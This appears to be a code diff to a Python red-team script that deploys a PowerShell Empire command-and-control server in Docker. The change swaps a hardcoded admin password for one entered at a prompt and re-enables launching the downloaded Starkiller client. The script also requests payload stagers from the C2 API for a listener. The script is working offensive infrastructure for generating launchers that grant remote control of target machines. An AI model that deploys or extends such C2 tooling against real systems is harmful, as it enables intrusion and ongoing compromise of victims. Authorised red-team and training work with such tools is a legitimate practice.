@@ -8,6 +8,7 @@ from time import sleep
 import urllib3
 import sys
 import more_itertools
+import getpass
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 def c2(LOCAL_IP) -> None | str:
@@ -31,9 +32,9 @@ def c2(LOCAL_IP) -> None | str:
                 if 'Plugin csharpserver ran successfully!' in container.logs(tail=3).decode('utf-8'):
                     print('\n[+] C2 started successfully from existing docker (ID: {0})'.format(client.containers.list(all)[i].short_id))
                     break
-            token = c2_token()
-            print('[+] C2 token : {0}'.format(token))
             print('[+] Listening on port 8888 (CLIHTTP)')
+            password = getpass.getpass('[!] Enter a password to access the C2 : ')
+            token = c2_token(password)
             return client.containers.list(all)[i].short_id, token
     if not is_up:
         infos = deploy_c2(LOCAL_IP)
@@ -57,10 +58,17 @@ def starkiller():
         r_github = requests.get(STARKILLER_URL, allow_redirects=True)
         open(STARKILLER_PATH, 'wb').write(r_github.content)
     subprocess.Popen(["chmod", "+x", STARKILLER_PATH])
-    #subprocess.Popen([STARKILLER_PATH])
+    subprocess.Popen([STARKILLER_PATH])
 
 def deploy_c2(LOCAL_IP):
     print('[+] Deploying C2 container')
+    while True:
+        password = getpass.getpass('[!] Enter a password to access the C2 : ')
+        confirm_password = getpass.getpass('[!] Confirm the password : ')
+        if password == confirm_password:
+            break
+        else:
+            print('[!] Passwords do not match. Try again please.')
     C2_LISTENER_PORT = 8888
     client = docker.from_env()
     container = client.containers.run(image='bcsecurity/empire:latest', ports={'1337/tcp':1337, '5000/tcp':5000, '{}/tcp'.format(C2_LISTENER_PORT):C2_LISTENER_PORT}, name='empire', tty=True, detach=True)
@@ -73,16 +81,17 @@ def deploy_c2(LOCAL_IP):
         if 'Plugin csharpserver ran successfully!' in logs:
             print('\n[+] C2 created successfully')
             break
-    token = c2_token()
+    container.exec_run("./ps-empire server --username empireadmin --password '{0}'".format(password))
+    token = c2_token(password)
     c2_listener(token, LOCAL_IP)
     print('[+] C2 container created successfully (Docker ID : {0})'.format(container.short_id))
     print('[+] Listener created on port {} (CLIHTTP)'.format(C2_LISTENER_PORT))
     return container.short_id, token
 
-def c2_token():
+def c2_token(password):
     url_c2 = 'https://localhost:1337/api/admin/login'
     headers = {"Content-Type": "application/json"}
-    param = {"username":"empireadmin", "password":"password123"}
+    param = {"username":"empireadmin", "password":"{0}".format(password)}
     r_c2 = requests.post(url_c2, headers=headers, json=param, verify=False)
     json_token = json.loads(r_c2.text)
     token = json_token['token']
@@ -101,7 +110,6 @@ def get_stager(system, token):
         system = 'multi/launcher'
     else:
         return "Error: OS not defined."
-
     url_stager = 'https://localhost:1337/api/stagers?token={0}'.format(token)
     param_stager = {"StagerName":"{0}".format(system), "Listener":"CLIHTTP"}
     headers_stager = {"Content-Type": "application/json"}
